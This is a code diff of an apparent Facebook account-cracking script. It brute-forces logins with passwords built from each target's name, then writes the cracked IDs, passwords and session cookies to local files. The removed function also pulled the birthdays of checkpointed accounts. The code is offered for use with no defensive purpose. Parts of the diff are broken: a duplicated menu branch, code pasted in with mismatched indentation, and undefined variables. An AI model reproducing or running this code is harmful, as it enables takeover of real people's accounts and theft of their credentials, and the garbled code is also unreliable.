@@ -237,7 +237,9 @@ def menu():
                                                 elif mthd in ['3','03']:
                                                         crack_submit.submit(ffb1,ids,names,passlist)
                                                 elif mthd in ['4','04']:
-                                                        crack_submit.submit(mbasic,ids,names,passlist)        
+                                                        crack_submit.submit(api2,ids,names,passlist)  
+                                                elif mthd in ['4','04']:
+                                                        crack_submit.submit(api2,ids,names,passlist)            
                                                 else:
                                                         crack_submit.submit(api1,ids,names,passlist)
                                 print('\033[1;37m')
@@ -308,6 +310,50 @@ def ffb1(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,proxies=proxs)
+                        Rahul=session.cookies.get_dict().keys()
+                        if "c_user" in Rahul:
+                                coki=session.cookies.get_dict()
+                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/RB-COOKIES.txt', 'a').write(ids+'|'+kuki+'\n')
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in Rahul:
+                                if 'y' in pcp:
+                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                        
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+xxxxx=()
+def ffb(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush() 
+        session = requests.Session()
+        try:
+                first = names.split(' ')[0]
+                try:
+                        last = names.split(' ')[1]
+                except:
+                        last = 'Khan'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+                        ua=random.choice(ugen)
+                        head = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
+			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
                         Rahul=session.cookies.get_dict().keys()
                         if "c_user" in Rahul:
                                 coki=session.cookies.get_dict()
@@ -520,54 +566,7 @@ def api3(ids,names,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass
-def mbasic(ids,names,passlist):
-		global ok,cp,loop
-		sys.stdout.write('\r\033[1;97m [AKING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
-		sys.stdout.flush()
-		for pw in names:
-			pw = pw.lower()
-			try: os.mkdir('')
-			except: pass
-			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
-			except (KeyError, IOError):
-				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-			ses = requests.Session()
-			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
-			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
-			if 'c_user' in ses.cookies.get_dict():
-				IMTIAZ_AKING('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
-				wrt = '%s - %s' % (user,pw)
-				ok.append(wrt)
-				open('OK.txt','a').write('%s\n' % wrt)
-				break
-				continue
-			elif 'checkpoint' in ses.cookies.get_dict():
-				try:
-					token = IMTIAZ('token.txt').read()
-					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
-					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
-					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
-					cp.append(wrt)
-					open('CP.txt','a').write('%s\n' % wrt)
-					break
-				except (KeyError, IOError):
-					month = ''
-					day   = ''
-					year  = ''
-				except:
-					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      ' % (user,pw,tahun(user)))
-				wrt = '%s - %s%s'%(user,pw,tahun(user))
-				cp.append(wrt)
-				open('CP.txt','a').write('%s\n' % wrt)
-				break
-				continue
-		loop += 1                        
+                        
                         
 try:
         approval()
